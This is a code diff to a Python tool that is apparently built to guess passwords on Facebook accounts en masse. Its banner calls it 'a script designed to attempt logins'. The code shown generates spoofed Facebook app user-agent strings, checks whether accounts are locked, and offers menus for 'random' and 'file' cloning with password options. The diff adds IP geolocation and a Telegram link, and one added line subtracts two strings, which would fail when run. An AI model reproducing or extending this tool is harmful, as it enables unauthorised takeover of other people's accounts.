@@ -790,23 +790,31 @@ def ua():
     samsung_ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {str(gtt)} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ''' + '[FBAN/FB4A;FBAV/435.0.0.42.112;FBBV/523162173;FBDM/{density=2.8125,width=1080,height=2136};FBLC/fi_FI;FBRV/526298101;FBCR/Telenor ;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/GM1903;FBSV/12;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171849;FBDM/{density=2.75,width=1080,height=2131};FBLC/pt_BR;FBRV/0;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293906223;FBDM/{density=2.9125001,width=2560,height=1516};FBLC/ru_RU;FBRV/296240860;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SCM-W09;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957690;FBDM/{density=3.0,width=1080,height=1800};FBLC/en_US;FBRV/334698665;FBCR/3 Macau;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/BAC-L22;FBSV/8.0.0;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/282.0.0.40.117;FBBV/236468732;FBDM/{density=2.625,width=1080,height=1794};FBLC/en_US;FBRV/238430540;FBCR/Ufone;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 6.1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
     ua_ = random.choice([vivo_ua, infinix_ua, realme_ua, redmi_ua, oppo_ua, itel_ua, nokia_ua, samsung_ua])
     return ua_
-
+#----------get_current_city-------#
+def get_current_location():
+    try:
+        response = requests.get('https://ipinfo.io/json')
+        response.raise_for_status()  # Raise an HTTPError for bad responses
+        data = response.json()
+        city = data.get('city', 'Unknown')
+        country = data.get('country', 'Unknown')
+        return city, country
+    except requests.RequestException as e:
+        print("Error fetching current location:", e)
+        return None, None
+# Example usage
+current_city, current_country = get_current_location()
 os.system("xdg-open https://t.me/Ariff_attackermen_Frome_lautan")
 os.system("clear")
     
-logo = """                                                               
-\033[32m     oooooooooo.   oooooooooooo oooooo     oooo 
-\033[32m      888'   `Y8b  `888'     `8  `888.     .8'  
-\033[32m      888      888  888           `888.   .8'   
-\033[1;32m      888      888  888oooo8       `888. .8'    
-\033[1;32m      888      888  888    "        `888.8'     
-\033[1;32m      888     d88'  888       o      `888'      
-  \033[1;32m    o888bood8P'   o888ooooood8       `8'                                     
-===============================================
- [â¢]\033[1;37m AUTHOR       : \033[1;37m DEV ARRYA RAHUL 
- [â¢]\033[1;37m TOOL STATUS  :\033[1;37m FUCK YOU
- [â¢]\033[1;37m TOOL VERSION :\033[1;37m  OPEN SOURCE 
-==============================================="""
+logo =(f"""
+{faltu} {black}"If you get tired, learn to rest, not to quit".... {pvt}
+\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+\033[1;32m[\033[1;31m✓\033[1;32m] Author     : SUMON ROY
+\033[1;32m[\033[1;31m✓\033[1;32m] ABOUTS     : a script designed to attempt logins
+\033[1;32m[\033[1;31m✓\033[1;32m] Tool Types : \033[1;36mFile × \033[1;36mRandom 
+\033[1;32m[\033[1;31m✓\033[1;32m] VERSION    : \033[1;32m0.0.1
+\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
 
 def check_lock(cid):
     req = str(requests.get(f'https://graph.facebook.com/{cid}/picture?type=normal').text)
@@ -834,6 +842,7 @@ blue = "\033[1;34m"
 pink = "\033[1;35m"
 cyan = "\033[1;36m"
 white = "\033[1;37m"
+faltu = "\033[1;47m";pvt = "\033[1;0m";black="\033[1;30m"
 #--------[ LISTS && LOOPS ]---------#
 loop = 0
 oks = []
@@ -882,8 +891,8 @@ def linex():
     print("--------------------------------------------------------------------------------------")
 
 def dev_time():
-   #print(f" [â¢] Time : {timex} ")
-    print(f" [â¢] Date : {datex} ")
+    print(f"\033[1;32m[\033[1;31m✓\033[1;32m] location : {current_city - current_country} ")
+    print(f"\033[1;32m[\033[1;31m✓\033[1;32m] Date : {datex} ")
     linex()
 
 def menu():
@@ -897,13 +906,13 @@ def menu():
     print(" [5] CONTACT (TELEGRAM) ")
     print(" [6] EXIT TOOL ")
     linex()
-    devv = input("âCHOOSE> ")
-    if devv =='1':f_clone()
-    elif devv =='2':r_clone()
-    elif devv =='3':n_clone()
-    elif devv =='4':g_clone()
-    elif devv =='5':os.system("xdg-open https://t.me/Ariff_attackermen_Frome_lautan");menu()
-    elif devv =='6':exit()
+    bithi = input("âCHOOSE> ")
+    if bithi =='1':f_clone()
+    elif bithi =='2':r_clone()
+    elif bithi =='3':n_clone()
+    elif bithi =='4':g_clone()
+    elif bithi =='5':os.system("xdg-open https://t.me/Ariff_attackermen_Frome_lautan");menu()
+    elif bithi =='6':exit()
     else:
         print("SELECT CORRECT OPTION")
         time.sleep(1)
@@ -984,13 +993,13 @@ def r_clone():
     print(" [5] RONDAM 4 CHOICE PASS")
     print(" [6] GAMING CLONE")
     linex()
-    devv = input("âCHOOSE> ")
-    if devv =='1':dev1()
-    elif devv =='2':dev2()
-    elif devv =='3':dev3()
-    elif devv =='4':dev4()
-    elif devv =='5':dev5()
-    elif devv =='6':dev6()
+    bithi = input("âCHOOSE> ")
+    if bithi =='1':dev1()
+    elif bithi =='2':dev2()
+    elif bithi =='3':dev3()
+    elif bithi =='4':dev4()
+    elif bithi =='5':dev5()
+    elif bithi =='6':dev6()
     else:
         print("SELECT CORRECT OPTION")
         time.sleep(1)
